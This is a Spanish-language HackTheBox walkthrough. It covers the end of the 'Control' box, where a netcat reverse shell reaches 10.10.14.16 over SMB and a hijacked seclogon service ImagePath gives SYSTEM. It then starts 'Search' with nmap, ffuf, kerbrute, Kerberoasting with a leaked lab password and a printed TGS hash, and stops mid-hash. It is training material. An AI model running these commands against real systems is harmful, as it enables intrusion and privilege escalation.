<p>Habiendo encontrado <a href="https://lazyadmin.nl/powershell/start-process/">esta</a> y <a href="https://davidhamann.de/2019/12/08/running-command-different-user-powershell/">esta</a> referencias, se enviaron las siguientes instrucciones para lograr ejecutar comandos como el usuario <code>hector</code>.</p>
<p>Previamente identificando el nombre de la máquina y/o hostname con:</p>
<pre><code class="language-powershell"># Cualquiera de los siguientes comandos
hostname
$env:COMPUTERNAME
[Environment]::MachineName
</code></pre>
<p>Según lo indica <a href="https://adamtheautomator.com/powershell-get-computer-name/">este blog</a> para encontrar ese valor y usarlo posteriormente.</p>
<p><img src="htb/boxes/windows/3_dificil/Control/images/post_2.png" alt="Nombre de máquina" /></p>
<pre><code class="language-powershell">$userName = 'fidelity\hector'
$userPassword = 'l33th4x0rhector'
$secStringPassword = ConvertTo-SecureString $userPassword -AsPlainText -Force
$credObject = New-Object System.Management.Automation.PSCredential ($userName, $secStringPassword)
Invoke-Command -ComputerName Fidelity -Credential $credObject -ScriptBlock { whoami }
</code></pre>
<p>Logrando así ejecución como el usuario <code>hector</code>.</p>
<p><img src="htb/boxes/windows/3_dificil/Control/images/post_3.png" alt="Ejecución de comandos como hector" /></p>
<p>Dadas las limitaciones que se obtuvieron al ejecutar el mismo binario de <code>netcat</code> previamente subido debido a permisos, se decidió ejecutar el mismo binario con la diferencia de ejecutarlo a través de red, exponiendo el binario mediante:</p>
<pre><code class="language-bash">impacket-smbserver smbFolder $(pwd) -smb2support
</code></pre>
<p>Y ejecutándolo con:</p>
<pre><code class="language-powershell">Invoke-Command -ComputerName Fidelity -Credential $credObject -ScriptBlock { \\10.10.14.16\smbFolder\nc.exe -e cmd.exe 10.10.14.16 4321 }
</code></pre>
<p>Obteniendo así una segunda revershell pero en esta ocasión como el usuario <code>hector</code>.</p>
<p><img src="htb/boxes/windows/3_dificil/Control/images/post_4.png" alt="Reverse shell como hector" /></p>
<h3 id="hector--nt-authoritysystem"><a class="header" href="#hector--nt-authoritysystem">hector → nt authority\system</a></h3>
<p>Buscando obtener información relevante para escalar como administrador, se ejecutó <a href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS">winPEAS</a>, identificando que se cuenta con un gran número de registros a los cuales se tiene acceso completo.</p>
<p><img src="htb/boxes/windows/3_dificil/Control/images/post_5.png" alt="Lista de registros con acceso" /></p>
<p>Bajo el conocimiento de escenarios previos, se sabe que es posible modificar la configuración de los servicios para poder secuestrar la ruta del binario, si se lograra identificar un servicio que se estuviera ejecutando como administrador al lograr la modificación e iniciar el servicio se obtendría acceso como administrador. Dichas configuraciones de servicios se suelen encontrar en los valores de los registros mostrados, por lo que, se realizó un filtrado de estos servicios bajo su perfil de ejecución y status para que a la hora de modificarlo se pudiera iniciar el servicio.</p>
<pre><code class="language-powershell">$services = Get-ItemProperty -Path HKLM:\System\CurrentControlSet\Services\* # Para obtener todos los servicios
$filtered_services = $services | where { ($_.ObjectName -match 'LocalSystem') -And ($_.Start -match '3') } # Para filtar y obtener los servicios que se ejecuten con permisos elevados y que se puedan iniciar manualmente
</code></pre>
<p>En este punto quedaría filtrar los servicios a los que el usuario hector cuenta con permisos para iniciar cualquier servicio. Para esto se requiere identificar el servicio que cuente con la cadena <code>RP</code> según es especificado en <a href="https://dimitri.janczak.net/2018/06/01/start-stop-service-rights-to-non-administrators/">este blog</a> en la propiedad de <code>Sddl</code> de los permisos desplegados de la lista actual de servicios.</p>
<p><img src="htb/boxes/windows/3_dificil/Control/images/post_6.png" alt="Propiedad sddl de lista de registros" /></p>
<p>Lo que individualmente por servicio es ubicado en la propiedad <code>Security</code>, en donde se encuentra en forma binaria.</p>
<p><img src="htb/boxes/windows/3_dificil/Control/images/post_7.png" alt="Propiedad security de registro" /></p>
<p>Trasladandolo a una lectura similar a la propiedad <code>sddl</code>, se puede ejecutar <code>cmd /c sc sdshow wuauserv</code> para visualizar el valor de mejor manera.</p>
<p><img src="htb/boxes/windows/3_dificil/Control/images/post_8.png" alt="Propiedad security convertida a sddl" /></p>
<p>Igualmente, el resultado no es entendible a menos que se busque alguna referencia para comparar, por lo que se puede hacer uso de:</p>
<pre><code class="language-powershell">ConvertFrom-SDDLString -Sddl &quot;D:(A;;CCLCSWRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)&quot;
</code></pre>
<p>Para visualizarlo de mejor manera ya que se permite su conversión mediante powershell.</p>
<p><img src="htb/boxes/windows/3_dificil/Control/images/post_9.png" alt="Lectura de propiedad sddl" /></p>
<p>Por lo que se iteró en la lista previa de servicios la búsqueda de este permiso mediante el siguiente ciclo:</p>
<pre><code class="language-powershell">$services_names = $filtered_services.pschildname
foreach ($service in $services_names) {
    $sddl = (cmd /c sc sdshow $service)
    if ($sddl -match &quot;RP[A-Z]*?;;;AU&quot;) {
        $service
    }
}

# Iteración en una línea
$canStartServices = foreach ($service in $services_names) {$sddl = (cmd /c sc sdshow $service); if ($sddl -match &quot;RP[A-Z]*?;;;AU&quot;) { $service }}
</code></pre>
<p>Dando como resultado la lista de los servicios buscados.</p>
<p><img src="htb/boxes/windows/3_dificil/Control/images/post_10.png" alt="Servicios filtrados" /></p>
<p>Obteniendo lo anterior se puede modificar la propiedad <code>ImagePath</code> del servicio y ejecutar lo que se desee una vez que el servicio sea iniciado. Se puede lograr este comportamiento tanto como haciendo uso de cmd como de powershell.</p>
<h4 id="usando-powershell"><a class="header" href="#usando-powershell">Usando powershell</a></h4>
<p>Mediante powershell habría que:</p>
<p><img src="htb/boxes/windows/3_dificil/Control/images/post_11.png" alt="Valores de servicio a modificar" /></p>
<ol>
<li>
<p>Asegurar encontrarse en la ruta de los registros:</p>
<pre><code class="language-powershell">cd HKLM:\system\currentcontrolset\services
</code></pre>
</li>
<li>
<p>Obtener las propiedades del servicio requerido:</p>
<pre><code class="language-powershell">get-item -path seclogon
</code></pre>
</li>
<li>
<p>Visualizar el valor a cambiar de <code>ImagePath</code></p>
</li>
</ol>
<p><img src="htb/boxes/windows/3_dificil/Control/images/post_12.png" alt="Modificaciones de servicio" /></p>
<ol>
<li>
<p>Ejecutar (para modificar los valores con los deseados):</p>
<pre><code class="language-powershell">set-itemproperty seclogon -name imagepath -value &quot;\\10.10.14.16\smbFolder\nc.exe -e cmd.exe 10.10.14.16 443&quot;
</code></pre>
</li>
<li>
<p>Obtener las propiedades del servicio requerido <code>seclogon</code> para validar el cambio.</p>
</li>
<li>
<p>Visualizar el cambio realizado a <code>ImagePath</code>.</p>
</li>
</ol>
<p>El cual al montar la conexión de escucha, bastaría con iniciar el servicio con:</p>
<pre><code class="language-powershell">start-service seclogon
</code></pre>
<p>Para así ejecutar el binario indicado.</p>
<p><img src="htb/boxes/windows/3_dificil/Control/images/post_13.png" alt="Reverse shell como nt authority\system" /></p>
<h4 id="usando-cmd"><a class="header" href="#usando-cmd">Usando cmd</a></h4>
<p>Mediante cmd se realizaría el mismo procedimiento con respectivos cambios en los comandos debido que powershell configura alias en algunos comandos, por lo que, se ejecutaría:</p>
<ol>
<li>
<p>Para visualizar los valores del servicio:</p>
<pre><code class="language-powershell">reg query HKLM\system\currentcontrolset\services\seclogon
</code></pre>
</li>
<li>
<p>Para cambiar los valores de la propiedad <code>ImagePath</code> de acuerdo a lo encontrado en <a href="https://www.windowscentral.com/how-edit-registry-using-command-prompt-windows-10">este blog</a> para realizar los cambios e identificar el tipo de dato a cambiar <code>REG_EXPAND_SZ</code> para efectuarlo correctamente:</p>
<pre><code class="language-powershell">reg add HKLM\system\currentcontrolset\services\seclogon /v ImagePath /t REG_EXPAND_SZ /d &quot;\\10.10.14.16\smbFolder\nc.exe -e cmd.exe 10.10.14.16 443&quot; /f
</code></pre>
</li>
<li>
<p>Para iniciar el servicio:</p>
<pre><code class="language-powershell">sc start seclogon
</code></pre>
</li>
</ol>
<h1 id="notas-adicionales-3"><a class="header" href="#notas-adicionales-3">Notas adicionales</a></h1>
<p>Mientras resolvía la máquina encontré diversos problemas para ejecutar el mismo binario de netcat, ya hubiera sido si lo cargaba directamente a la máquina o lo ejecutaba a través del cliente smb, logré solucionarlo empleando otra subida de netcat mediante el usuario obtenido conforme iba realizando la escalación de privilegios.</p>
<p>Dado que durante el proceso de resolución personalmente busco lo equivalente a comparar respuestas en una evaluación por lo que, suelo leer write-ups y ver walkthroughs de otros usuarios principalmente de <a href="https://0xdf.gitlab.io/">0xdf</a> e <a href="https://www.youtube.com/c/ippsec">IppSec</a>, noté que ambos hicieron referencia a <a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker">AppLocker</a> ya que el mismo problema se presentó. Después de buscar más información al respecto, encontré que existen rutas en Windows las cuales suelen estar libres de estas restricciones, encontrando varias listas de estas rutas en <a href="https://github.com/api0cradle/UltimateAppLockerByPassList">repositorios de github</a> dándole motivo al uso de la ruta <code>C:\Windows\System32\spool\drivers\color</code> que se emplea en los write-ups.</p>
<h1 id="referencias-13"><a class="header" href="#referencias-13">Referencias</a></h1>
<ul>
<li><a href="https://teckk2.github.io/web-pentesting/2018/02/07/SQL-Injection-(Login-Form-User).html">SQL Injection</a>.</li>
<li><a href="https://crackstation.net/">CrackStation</a>.</li>
<li><a href="https://kayran.io/blog/web-vulnerabilities/sqli-to-rce/">SQLI to RCE</a>.</li>
<li><a href="https://docs.microsoft.com/en-us/previous-versions/office/developer/sharepoint-2010/ms474356(v=office.14)">How to: Find the Web Application Root</a>.</li>
<li><a href="https://lazyadmin.nl/powershell/start-process/">How to use Start Process in PowerShell</a>.</li>
<li><a href="https://davidhamann.de/2019/12/08/running-command-different-user-powershell/">Running commands in a specific user context in PowerShell</a>.</li>
<li><a href="https://stackoverflow.com/questions/60248354/powershell-jobs-vs-start-process">StackOverflow - PowerShell Jobs vs Start-Process</a>.</li>
<li><a href="https://adamtheautomator.com/powershell-get-computer-name/">Powershell get computer name</a>.</li>
<li><a href="https://www.windowscentral.com/how-edit-registry-using-command-prompt-windows-10">How to edit the Registry using Command Prompt on Windows 10</a>.</li>
<li><a href="https://www.itprotoday.com/compute-engines/what-are-errorcontrol-start-and-type-values-under-services-subkeys">Significado del valor Start en registros</a>.</li>
<li><a href="https://dimitri.janczak.net/2018/06/01/start-stop-service-rights-to-non-administrators/">Start Stop service rights to non administrators</a>.</li>
<li><a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker">What is AppLocker?</a>.</li>
<li><a href="https://github.com/api0cradle/UltimateAppLockerByPassList">Ultimate AppLocker ByPass List</a>.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="search"><a class="header" href="#search">Search <!-- omit from toc --></a></h1>
<p>Write-up de la máquina Search de <a href="htb/boxes/windows/3_dificil/Search/hackthebox.com">HackTheBox</a>.</p>
<p><img src="htb/boxes/windows/3_dificil/Search/images/cover.png" alt="Cover de Search" /></p>
<h2 id="tabla-de-contenido-6"><a class="header" href="#tabla-de-contenido-6">Tabla de Contenido <!-- omit from toc --></a></h2>
<ul>
<li><a href="htb/boxes/windows/3_dificil/Search/index.html#introducci%C3%B3n">Introducción</a>
<ul>
<li><a href="htb/boxes/windows/3_dificil/Search/index.html#t%C3%A9cnicas-vistas--tags">Técnicas vistas / Tags</a></li>
<li><a href="htb/boxes/windows/3_dificil/Search/index.html#estad%C3%ADsticas">Estadísticas</a></li>
</ul>
</li>
<li><a href="htb/boxes/windows/3_dificil/Search/index.html#reconocimiento">Reconocimiento</a>
<ul>
<li><a href="htb/boxes/windows/3_dificil/Search/index.html#escaneo-de-host">Escaneo de host</a>
<ul>
<li><a href="htb/boxes/windows/3_dificil/Search/index.html#escaneo-completo-de-puertos">Escaneo completo de puertos</a></li>
<li><a href="htb/boxes/windows/3_dificil/Search/index.html#escaneo-espec%C3%ADfico">Escaneo específico</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="htb/boxes/windows/3_dificil/Search/index.html#enumeraci%C3%B3n">Enumeración</a>
<ul>
<li><a href="htb/boxes/windows/3_dificil/Search/index.html#servicios">Servicios</a>
<ul>
<li><a href="htb/boxes/windows/3_dificil/Search/index.html#http---80">http - 80</a>
<ul>
<li><a href="htb/boxes/windows/3_dificil/Search/index.html#manual">Manual</a></li>
<li><a href="htb/boxes/windows/3_dificil/Search/index.html#ffuf">ffuf</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><a href="htb/boxes/windows/3_dificil/Search/index.html#explotaci%C3%B3n">Explotación</a>
<ul>
<li><a href="htb/boxes/windows/3_dificil/Search/index.html#kerberoasting">Kerberoasting</a>
<ul>
<li><a href="htb/boxes/windows/3_dificil/Search/index.html#pasos-previos--preparaci%C3%B3n">Pasos previos | Preparación</a></li>
<li><a href="htb/boxes/windows/3_dificil/Search/index.html#ejecuci%C3%B3n">Ejecución</a></li>
</ul>
</li>
<li><a href="htb/boxes/windows/3_dificil/Search/index.html#password-spraying">Password Spraying</a>
<ul>
<li><a href="htb/boxes/windows/3_dificil/Search/index.html#web_svc--edgarjacobs">web_svc → edgar.jacobs</a></li>
<li><a href="htb/boxes/windows/3_dificil/Search/index.html#edgarjacobs--sierrafrye">edgar.jacobs → sierra.frye</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="htb/boxes/windows/3_dificil/Search/index.html#post-explotaci%C3%B3n">Post Explotación</a>
<ul>
<li><a href="htb/boxes/windows/3_dificil/Search/index.html#enumeraci%C3%B3n-1">Enumeración</a></li>
<li><a href="htb/boxes/windows/3_dificil/Search/index.html#escalaci%C3%B3n-de-privilegios">Escalación de privilegios</a>
<ul>
<li><a href="htb/boxes/windows/3_dificil/Search/index.html#sierrafrya--tristandavies">sierra.frya → tristan.davies</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="htb/boxes/windows/3_dificil/Search/index.html#notas-adicionales">Notas adicionales</a></li>
<li><a href="htb/boxes/windows/3_dificil/Search/index.html#referencias">Referencias</a></li>
</ul>
<h2 id="introducción-3"><a class="header" href="#introducción-3">Introducción</a></h2>
<h3 id="técnicas-vistas--tags-3"><a class="header" href="#técnicas-vistas--tags-3">Técnicas vistas / Tags</a></h3>
<ul>
<li>Information Leakage - Password in picture</li>
<li>RPC Enumeration (rpcclient)</li>
<li>Ldap Enumeration (ldapdomaindump)</li>
<li>Bloodhound Enumeration</li>
<li>Kerberoasting Attack (GetUserSPNs.py)</li>
<li>SMB Password Spray Attack (Crackmapexec)</li>
<li>Unprotecting password-protected Excel (Remove Protection)</li>
<li>Playing with pfx certificates</li>
<li>Gaining access to Windows PowerShell Web Access</li>
<li>Abusing ReadGMSAPassword privilege</li>
<li>Abusing GenericAll privilege (Resetting a user's password)</li>
<li>Gaining access with wmiexec</li>
</ul>
<h3 id="estadísticas-11"><a class="header" href="#estadísticas-11">Estadísticas</a></h3>
<div class="table-wrapper"><table><thead><tr><th>Característica</th><th>Descripción</th></tr></thead><tbody>
<tr><td>Nombre</td><td><a href="https://www.hackthebox.com/home/machines/profile/422">Search</a></td></tr>
<tr><td>OS</td><td>Windows</td></tr>
<tr><td>Dificultad oficial</td><td>Hard</td></tr>
<tr><td>Dificultad de comunidad</td><td><img src="htb/boxes/windows/3_dificil/Search/images/diff.png" alt="Dificultad" /></td></tr>
<tr><td>Puntos</td><td>40</td></tr>
<tr><td>Creadores</td><td><a href="https://www.hackthebox.com/home/users/profile/610173">dmw0ng</a></td></tr>
</tbody></table>
</div>
<h2 id="reconocimiento-11"><a class="header" href="#reconocimiento-11">Reconocimiento</a></h2>
<h3 id="escaneo-de-host-11"><a class="header" href="#escaneo-de-host-11">Escaneo de host</a></h3>
<h4 id="escaneo-completo-de-puertos-11"><a class="header" href="#escaneo-completo-de-puertos-11">Escaneo completo de puertos</a></h4>
<pre><code class="language-bash">└─$ nmap -T5 --min-rate 5000 -v -p- -open -n -Pn -oG nmap/all_ports $TARGET
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-05-03 21:51 EDT
Initiating Connect Scan at 21:51
Scanning 10.10.11.129 [65535 ports]
Discovered open port 139/tcp on 10.10.11.129
Discovered open port 80/tcp on 10.10.11.129
Discovered open port 53/tcp on 10.10.11.129
Discovered open port 443/tcp on 10.10.11.129
Discovered open port 445/tcp on 10.10.11.129
Discovered open port 135/tcp on 10.10.11.129
Discovered open port 8172/tcp on 10.10.11.129
Discovered open port 49710/tcp on 10.10.11.129
Discovered open port 9389/tcp on 10.10.11.129
Discovered open port 88/tcp on 10.10.11.129
Discovered open port 49675/tcp on 10.10.11.129
Discovered open port 3269/tcp on 10.10.11.129
Discovered open port 49699/tcp on 10.10.11.129
Discovered open port 3268/tcp on 10.10.11.129
Discovered open port 49667/tcp on 10.10.11.129
Discovered open port 464/tcp on 10.10.11.129
Discovered open port 49676/tcp on 10.10.11.129
Discovered open port 49737/tcp on 10.10.11.129
Discovered open port 389/tcp on 10.10.11.129
Discovered open port 593/tcp on 10.10.11.129
Discovered open port 636/tcp on 10.10.11.129
Completed Connect Scan at 21:51, 26.37s elapsed (65535 total ports)
Nmap scan report for 10.10.11.129
Host is up (0.076s latency).
Not shown: 65514 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
443/tcp   open  https
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
8172/tcp  open  unknown
9389/tcp  open  adws
49667/tcp open  unknown
49675/tcp open  unknown
49676/tcp open  unknown
49699/tcp open  unknown
49710/tcp open  unknown
49737/tcp open  unknown

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.40 seconds
</code></pre>
<h4 id="escaneo-específico-11"><a class="header" href="#escaneo-específico-11">Escaneo específico</a></h4>
<pre><code class="language-bash">└─$ nmap -sCV -p 53,80,88,135,139,389,443,445,464,593,636,3268,3269,8172,9389,49667,49675,49676,49699,49710,49737 -n -Pn -oN nmap/targeted $TARGET
Starting Nmap 7.92 ( https://nmap.org ) at 2023-05-03 21:54 EDT
Nmap scan report for 10.10.11.129
Host is up (0.27s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Search &amp;mdash; Just Testing IIS
| http-methods:
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-05-04 01:54:40Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
|_ssl-date: 2023-05-04T01:56:19+00:00; 0s from scanner time.
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
|_ssl-date: 2023-05-04T01:56:18+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
| tls-alpn:
|_  http/1.1
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Search &amp;mdash; Just Testing IIS
|_http-server-header: Microsoft-IIS/10.0
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
|_ssl-date: 2023-05-04T01:56:18+00:00; 0s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-05-04T01:56:18+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
|_ssl-date: 2023-05-04T01:56:18+00:00; 0s from scanner time.
8172/tcp  open  ssl/http      Microsoft IIS httpd 10.0
| tls-alpn:
|_  http/1.1
| ssl-cert: Subject: commonName=WMSvc-SHA2-RESEARCH
| Not valid before: 2020-04-07T09:05:25
|_Not valid after:  2030-04-05T09:05:25
|_ssl-date: 2023-05-04T01:56:18+00:00; 0s from scanner time.
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title.
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc         Microsoft Windows RPC
49699/tcp open  msrpc         Microsoft Windows RPC
49710/tcp open  msrpc         Microsoft Windows RPC
49737/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: RESEARCH; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2023-05-04T01:55:42
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 112.17 seconds
</code></pre>
<h2 id="enumeración-21"><a class="header" href="#enumeración-21">Enumeración</a></h2>
<h3 id="servicios-11"><a class="header" href="#servicios-11">Servicios</a></h3>
<h4 id="http---80-6"><a class="header" href="#http---80-6">http - 80</a></h4>
<h5 id="manual-7"><a class="header" href="#manual-7">Manual</a></h5>
<p>La página principal muestra personas de la empresa, las cuales podrían representar potenciales nombres de usuario dado que se puede asumir que trata de un Domain Controller dados los puertos abiertos (53,88).</p>
<p><img src="htb/boxes/windows/3_dificil/Search/images/enum_1.png" alt="Personas del sitio" /></p>
<p>Adicionalmente se identificó dentro de la sección que habla acerca de los servicios de la empresa una imagen con anotaciones en ella.</p>
<p><img src="htb/boxes/windows/3_dificil/Search/images/enum_2.png" alt="Slider de servicios" /></p>
<p>Al prestar atención a las notas escritas, se puede identificar el nombre de dos personas y una posible contraseña.</p>
<p><img src="htb/boxes/windows/3_dificil/Search/images/enum_3.png" alt="Usuario y contraseña expuesta" /></p>
<ol>
<li><code>IsolationIsKey?</code>.</li>
</ol>
<h5 id="ffuf-5"><a class="header" href="#ffuf-5">ffuf</a></h5>
<p>Por otro lado, por medio de <code>ffuf</code> se identificaron las siguientes rutas de las cuales a pesar de no tener acceso sobresalen <code>/staff</code> y <code>/certsrv</code>.</p>
<pre><code class="language-bash">└─$ ffuf -c -ic -u &quot;http://10.10.11.129/FUZZ&quot; -w /usr/share/wordlists/dirb/common.txt

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.5.0 Kali Exclusive &lt;3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.129/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

                        [Status: 200, Size: 44982, Words: 13260, Lines: 1030, Duration: 213ms]
certenroll              [Status: 301, Size: 154, Words: 9, Lines: 2, Duration: 142ms]
certsrv                 [Status: 401, Size: 1293, Words: 81, Lines: 30, Duration: 206ms]
css                     [Status: 301, Size: 147, Words: 9, Lines: 2, Duration: 597ms]
fonts                   [Status: 301, Size: 149, Words: 9, Lines: 2, Duration: 72ms]
images                  [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 72ms]
Images                  [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 72ms]
index.html              [Status: 200, Size: 44982, Words: 13260, Lines: 1030, Duration: 73ms]
js                      [Status: 301, Size: 146, Words: 9, Lines: 2, Duration: 546ms]
staff                   [Status: 403, Size: 1233, Words: 73, Lines: 30, Duration: 3971ms]
:: Progress: [4614/4614] :: Job [1/1] :: 263 req/sec :: Duration: [0:00:34] :: Errors: 0 ::
</code></pre>
<h2 id="explotación-11"><a class="header" href="#explotación-11">Explotación</a></h2>
<h3 id="kerberoasting-2"><a class="header" href="#kerberoasting-2">Kerberoasting</a></h3>
<h4 id="pasos-previos--preparación-7"><a class="header" href="#pasos-previos--preparación-7">Pasos previos | Preparación</a></h4>
<p>Dados los nombres identificados se realizó una lista con variaciones de nombres usuarios que suelen presentarse en entornos de directorio activo o que suelen ser comunes en empresas. Para corroborar aquellos válidos contra la máquina.</p>
<pre><code class="language-text">Keely Lyons
Dax Santiago
Sierra Frye
Kyla Stewart
Kaiara Spencer
Dave Simpson
Ben Thompson
Chris Stewart
Phisher Walter
Hope Sharp
Keely.Lyons
Dax.Santiago
Sierra.Frye
Kyla.Stewart
Kaiara.Spencer
Dave.Simpson
Ben.Thompson
Chris.Stewart
Phisher.Walter
Hope.Sharp
KLyons
DSantiago
SFrye
KStewart
KSpencer
DSimpson
BThompson
CStewart
PWalter
HSharp
KeelyL
DaxS
SierraF
KylaS
KaiaraS
DaveS
BenT
ChrisS
PhisherW
HopeS
</code></pre>
<pre><code class="language-bash">└─$ /opt/tools/windows/active_directory/kerbrute/kerbrute userenum content/users.txt --dc search.htb -d search.htb

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 05/05/23 - Ronnie Flathers @ropnop

2023/05/05 16:27:17 &gt;  Using KDC(s):
2023/05/05 16:27:17 &gt;   search.htb:88

2023/05/05 16:27:17 &gt;  [+] VALID USERNAME:       Sierra.Frye@search.htb
2023/05/05 16:27:17 &gt;  [+] VALID USERNAME:       Dax.Santiago@search.htb
2023/05/05 16:27:17 &gt;  [+] VALID USERNAME:       Keely.Lyons@search.htb
2023/05/05 16:27:17 &gt;  [+] VALID USERNAME:       Hope.Sharp@search.htb
2023/05/05 16:27:18 &gt;  Done! Tested 40 usernames (4 valid) in 0.724 seconds
</code></pre>
<h4 id="ejecución-18"><a class="header" href="#ejecución-18">Ejecución</a></h4>
<p>Habiendo identificado el patrón y el usuario <code>Hope.Sharp</code> como válido, se intentó autenticar contra otros servicios disponibles sin éxito por lo que se ejecutó el script <code>impacket-GetUserSPNs</code> para buscar cuentas cuentas de servicio asociadas, obteniendo así el hash de la cuenta <code>web_svc</code>.</p>
<pre><code class="language-bash">└─$ impacket-GetUserSPNs 'search.htb/Hope.Sharp:IsolationIsKey?' -dc-ip 10.10.11.129 -request
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

ServicePrincipalName               Name     MemberOf  PasswordLastSet             LastLogon  Delegation
---------------------------------  -------  --------  --------------------------  ---------  ----------
RESEARCH/web_svc.search.htb:60001  web_svc            2020-04-09 08:59:11.329031  &lt;never&gt;

$krb5tgs$23$*web_svc$SEARCH.HTB$search.htb/web_svc*$e4e91c0ded69711c5e46663a3d941033$bc25caca76a25319cd9f4f512b04e8ef8f295a34ffa3190c480d8f19bfd256f33b7a875a28c0fade7eec04932cb51d809cab487208a8ad0a062d68a53bc7dd86f0a5504d4e3b8cfe15360868d812e057835654ed3a6e2e5c7af2b2a2e15d93266b7502f36b1872bdd65f798696bb7c3caf1cbebd6bd9b3e425a66cd7c55e56841cc8c7fbbfca30d1b6f97cc62997d979e2b65d3289ca9e84d6af847e3280561e246cedceb3e876080f30b98a799c0ce0c962387bd0c849353efbb16d795609cb4a5da2f63b19be19cb4d44b5e1b2f1dd1a86375851d15c8144f83dc611541131ab82081306cb4e5894e327f28ec9d69fae104e95db6da18cc21f2375ec811a99e21de24ea6aeb1eb3c82e456ac52e561c93161f2b991f4b4d3ee0855df4efa4dfb72bda2834fe378cf61d3f2aba87f8fbfcc9bb4e96577cf7959ab396de7c70a97d3f979f4f4768e76b19ed7d7877407c4981bc10c5c0ad458d070f7840b4ff59c8433451dbf8a4141b732ef4415d694fbe1108f32d9e0b67256ba791a5c96591b151cabe4d1918f0e19bb3e5682c62104d82354eae828d72b08dca8f82856cc9d99ee4b98ab619be0b1863de1efd1711f9dee6a7b4bc25082ce1bf05b55e2e17110e802164b32d18e7dd3a3a4991ff802ddb0643c14a8bcb9d481d14c97018c4c771cf08f7b0ea0e1646604a99a29dcae4a3b31f75df53146c27c3a5ef4fdaa1b4bf9fa25f1e212e0ff3384fd90c611c5da3dfd006f49ccc2d5ac3fdad439a4f7136e4f48812ff1c76b99de5b5697361604ac9a252c23eb723a25d23542d995d2c38e44f7b0aa29f489dc6ded4615596b1a2ceb79973a8a5972d0d67235c43c25b9d4eeee0dedba4ce0946f58ca33dc80c35e1b09139bd52a6a66219761e734a261f7ed4d2078bb6eaba7d463ebfe392c814b58623d16903d0e3e6ef3e14dd52e37dbe461dbc4d6db13d75